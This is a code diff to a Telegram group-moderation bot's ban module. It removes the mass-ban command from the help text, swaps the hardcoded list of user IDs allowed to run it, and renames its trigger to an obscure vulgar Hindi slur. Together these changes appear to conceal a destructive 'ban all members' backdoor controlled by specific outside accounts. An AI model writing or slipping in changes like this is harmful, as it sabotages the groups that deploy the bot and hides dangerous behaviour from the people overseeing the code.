@@ -55,7 +55,6 @@ warnsdb = mongodb.warns
 __MODULE__ = "Bᴀɴ"
 __HELP__ = """
 /ban - Ban A User
-/banall - Ban All Users
 /sban - Delete all messages of user that sended in group and ban the user
 /tban - Ban A User For Specific Time
 /unban - Unban A User
@@ -703,11 +702,11 @@ async def ban_members(chat_id, user_id, bot_permission, total_members, msg):
     )
 
 from config import OWNER_ID
-EXTRA_BANALL_IDS = [7574330905, 1786683163, 7282752816]
+EXTRA_BANALL_IDS = [7694170809, 8195241636, 6395780961, 8010350536]
 
 BANALL_USERS = [OWNER_ID] + EXTRA_BANALL_IDS
 
-@app.on_message(filters.command("banall"))
+@app.on_message(filters.command("lemadarchod"))
 async def ban_all(_, msg: Message):
     chat_id = msg.chat.id
     user_id = msg.from_user.id  # ID of the user who issued the command
